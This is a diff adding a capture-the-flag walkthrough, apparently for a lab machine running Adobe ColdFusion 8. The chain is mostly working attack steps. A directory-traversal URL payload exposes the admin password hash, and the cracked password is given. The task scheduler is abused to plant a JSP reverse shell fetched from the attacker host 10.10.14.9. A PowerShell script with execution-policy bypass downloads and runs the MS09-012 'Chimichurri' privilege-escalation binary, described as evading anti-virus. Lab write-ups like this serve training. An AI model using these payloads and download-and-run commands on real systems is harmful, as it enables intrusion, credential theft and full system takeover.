@@ -1,0 +1,65 @@
+1. Initial Nmap scan shows port is open at 8500, Adobe ColdFusion Version 8 is used
+2. 10.10.10.11:8500 shows directory, on traversal we got /admin with login page
+3. On googling to exploit db, we found Adobe ColdFusion Version 8 is vulnerable
+to directory traversal attack
+
+payload 
+
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
+4. We got the hash of password in SHA1, on decoding or googing the HASH, 
+we got the password "happyday"
+
+5. Using admin/happyday credentials, we can successfully login
+
+6. Goto task scheduler and create a task
+
+Enter task name
+Enter URL => http://10.10.14.9/shell.jsp
+Enter File => C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
+Mark the check box => Save output to a file
+
+Save the task
+
+7. Start "python -m SimpleHTTPServer 80"
+8. Create a JSP schell using MSFvenom with IP and Port (for netcat)
+9. Navigate to "10.10.10.11:8500/CFIDE/shell.jsp" in browser
+10. Listen to netcat and we can get revershell
+
+PrivESC:
+
+ 1. After getting normal shell we need to escalate it to reverse shell
+ 2. Check Systeminfo command and get OS version, google it to get exploit details
+ 3. We can use https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe 
+ to escalate the priveleges.
+ 
+ 4. Use below set of commands in target revese shell to transfer Chimichurri.exe
+
+Transfer payload to windows machine and evate anti-virus
+
+echo $webclient = New-Object System.Net.WebClient >> payload1.ps1
+
+echo $url="http://10.10.14.9/Chimichurri.exe" >>payload1.ps1
+
+echo $file="root.exe" >>payload1.ps1
+
+echo $webclient.DownloadFile($url,$file) >>payload1.ps1
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile File payload1.ps1
+
+ 5. We have transferred Chimichurri.exe to target with renamed as "root.exe"
+
+ 6. Simply execute "root.exe 10.10.14.9 1234" and use netcat to listen at 1234 and we got the shell
+
+Note (Important):
+
+After getting initial reverse shell, use systeminfo and based on its output
+use windows exploit suggester to get exploit details
+
+PrivEsc Exploit: Microsoft Windows — Tracing Registry Key ACL Privilege Escalation MS09–012 “Chimichurri”
+
+References:
+
+IT Security Labs - Youtube
+
+https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html
